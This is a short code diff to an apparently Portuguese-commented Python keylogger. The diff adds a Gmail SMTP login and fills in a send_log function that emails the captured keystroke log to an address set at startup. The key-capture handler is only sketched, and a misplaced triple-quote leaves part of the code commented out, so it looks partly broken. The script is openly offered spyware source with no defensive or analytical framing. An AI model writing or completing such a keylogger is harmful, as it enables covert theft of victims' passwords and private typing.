@@ -13,6 +13,8 @@ print("\nRun...\n")
 
 email = input('Digite o email: ')
 password = getpass.getpass(prompt='Password: ', stream=None)
+server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
+server.login(email, password)
 
 # configurando log para armazenar as capturas
 
@@ -25,7 +27,12 @@ email_char_limit = 20 # limite dos caracteres
 # registrar a captura da tecla
 def on_press(key):
 
+'''
+
 # enviar o log capturado para o email
 def send_log():
-
-'''
+    server.sendmail(
+        email,
+        email,
+        full_log
+    )
